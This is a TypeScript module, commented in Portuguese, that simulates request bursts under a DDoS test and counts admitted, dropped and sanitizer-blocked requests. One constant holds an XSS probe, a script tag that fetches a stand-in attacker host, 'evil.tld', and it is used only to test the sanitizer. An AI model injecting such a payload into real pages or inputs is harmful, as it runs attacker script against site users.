import { isMaliciousPayload } from "./sanitizer";

export const DDOS_BURST_SIZE = 950;
const NORMAL_BURST_BASE = 25;
const NORMAL_BURST_SPREAD = 35;
/** Requisições além deste teto são descartadas sem inspeção individual. */
const MAX_INSPECTED_PER_BURST = 120;
const MALICIOUS_PROBE_INTERVAL = 9;
const XSS_PROBE = "<script>fetch('http://evil.tld')</script>";

export interface BurstInspection {
  readonly burstSize: number;
  readonly accepted: number;
  readonly dropped: number;
  readonly maliciousBlocked: number;
}

export function estimateBurstSize(ddosSimulationActive: boolean, noise: number): number {
  return ddosSimulationActive
    ? DDOS_BURST_SIZE
    : Math.floor(NORMAL_BURST_BASE + noise * NORMAL_BURST_SPREAD);
}

/**
 * Submete uma rajada ao controle de admissão. `admit` decide requisição a
 * requisição (ex.: token bucket); durante um ataque, parte da rajada carrega
 * cargas maliciosas que precisam ser neutralizadas pelo sanitizador.
 */
export function inspectBurst(
  burstSize: number,
  ddosSimulationActive: boolean,
  admit: () => boolean,
): BurstInspection {
  const inspected = Math.min(burstSize, MAX_INSPECTED_PER_BURST);
  let accepted = 0;
  let maliciousBlocked = 0;

  for (let index = 0; index < inspected; index += 1) {
    const carriesProbe = ddosSimulationActive && index % MALICIOUS_PROBE_INTERVAL === 0;
    if (carriesProbe && isMaliciousPayload(XSS_PROBE)) maliciousBlocked += 1;
    if (admit()) accepted += 1;
  }

  return {
    burstSize,
    accepted,
    dropped: burstSize - accepted,
    maliciousBlocked,
  };
}
